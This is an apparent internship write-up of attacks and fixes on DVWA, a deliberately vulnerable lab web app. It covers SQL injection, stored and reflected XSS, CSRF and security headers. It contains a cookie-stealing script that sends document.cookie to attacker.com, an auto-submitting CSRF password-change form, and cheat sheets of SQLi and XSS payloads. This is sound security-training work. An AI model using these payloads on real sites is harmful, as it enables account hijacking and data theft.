# DVWA Security Testing - Internship Task 3

> Comprehensive security assessment and exploitation documentation of DVWA vulnerabilities with mitigation strategies.

## 📋 Table of Contents

1. [SQL Injection](#sql-injection)
2. [Cross-Site Scripting (XSS)](#cross-site-scripting)
3. [Cross-Site Request Forgery (CSRF)](#csrf)
4. [Security Headers](#security-headers)
5. [Quick Reference](#quick-reference)

---

## SQL Injection

### ⚠️ Vulnerability Details
- **Type:** SQL Injection
- **Risk:** CRITICAL (9.8/10)
- **Location:** `/vulnerabilities/sqli/`
- **Parameter:** User ID input

### 🎯 Attack Scenario

**Vulnerable Code:**
```php
$query = "SELECT first_name, surname FROM users WHERE user_id = '" . $_GET['id'] . "'";
```

**Attack Payload:**
```
Input: 1' OR '1'='1
Query becomes: SELECT * FROM users WHERE user_id = '1' OR '1'='1'
Result: ALL user records exposed
```

### 🛡️ Mitigation

**Use Prepared Statements:**
```php
$query = "SELECT first_name, surname FROM users WHERE user_id = ?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, "i", $_GET['id']);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);
```

**Input Validation:**
```php
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) {
    die("Invalid user ID");
}
```

---

## Cross-Site Scripting

### Stored XSS

**⚠️ Vulnerability Details**
- **Type:** Stored XSS
- **Risk:** HIGH (7.5/10)
- **Location:** Guest Book Module
- **Parameter:** Message field

**🎯 Attack Payload:**
```html
<script>
fetch('https://attacker.com/steal.php?cookie=' + document.cookie);
</script>
```

**🛡️ Mitigation:**
```php
// Sanitize Input
$message = filter_var($_POST['message'], FILTER_SANITIZE_STRING);

// Encode Output
$safe = htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
echo $safe;

// Add CSP Header
header("Content-Security-Policy: script-src 'self'");
```

### Reflected XSS

**⚠️ Vulnerability Details**
- **Type:** Reflected XSS
- **Risk:** HIGH (7.5/10)
- **Location:** Search/Greeting page
- **Parameter:** name query string

**🎯 Attack Vector:**
```
URL: http://dvwa/?name=<img src=x onerror="alert('XSS')">
```

**🛡️ Prevention:**
```php
$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "Hello " . $name;

// Add CSP Header
header("X-XSS-Protection: 1; mode=block");
```

---

## CSRF

### ⚠️ Vulnerability Details
- **Type:** Cross-Site Request Forgery
- **Risk:** HIGH (6.5/10)
- **Target:** Password change function
- **Method:** POST without token validation

### 🎯 Attack Scenario

**Malicious Page:**
```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
<form action="http://dvwa/change_password.php" method="POST">
    <input name="password_new" value="hacked" type="hidden">
    <input name="password_conf" value="hacked" type="hidden">
</form>
</body>
</html>
```

**Result:** Victim's password changed without confirmation

### 🛡️ Mitigation

**Implement CSRF Tokens:**

```php
// Generate Token
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>

<!-- In Form -->
<form method="POST" action="change_password.php">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <!-- Other fields -->
</form>

<?php
// Validate on Submit
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    http_response_code(403);
    die('CSRF token validation failed');
}
```

**Additional Protection:**
```php
// SameSite Cookie
session_set_cookie_params([
    'samesite' => 'Strict',
    'secure' => true,
    'httponly' => true
]);
```

---

## Security Headers

### ⚠️ Current Status: MISSING MOST HEADERS

### 🛡️ Recommended Configuration

**Apache (`/etc/apache2/conf-available/security-headers.conf`):**

```apache
<IfModule mod_headers.c>
    # Prevent MIME type sniffing
    Header always set X-Content-Type-Options "nosniff"
    
    # Prevent clickjacking
    Header always set X-Frame-Options "DENY"
    
    # Enable XSS filter
    Header always set X-XSS-Protection "1; mode=block"
    
    # HSTS
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    
    # Content Security Policy
    Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    
    # Referrer Policy
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    
    # Permissions Policy
    Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
</IfModule>
```

**Enable & Restart:**
```bash
sudo a2enmod headers
sudo a2enconf security-headers
sudo systemctl restart apache2
```

---

## Quick Reference

### SQL Injection Cheat Sheet
```
Union-based: ' UNION SELECT NULL, NULL, NULL --
Time-based: ' AND SLEEP(5) --
Boolean-based: ' AND '1'='1
```

### XSS Payloads
```javascript
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
javascript:alert('XSS')
```

### CSRF Prevention Checklist
- [ ] Generate unique token per request
- [ ] Validate token on server
- [ ] Use SameSite cookies
- [ ] Require re-authentication for sensitive actions
- [ ] Validate referrer header

---

## Tools Used

- **Burp Suite:** Request interception and modification
- **DVWA:** Vulnerable web application
- **Wireshark:** Network traffic analysis
- **Browser DevTools:** XSS payload testing

---

## Timeline & Deliverables

- ✅ SQL Injection exploitation & mitigation
- ✅ Stored & Reflected XSS exploitation & fixes
- ✅ CSRF attack demonstration & prevention
- ✅ Security headers implementation
- ✅ Video demo of attacks and mitigations

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

**Created:** September 2026 | **Updated:** Ongoing | **Status:** Complete
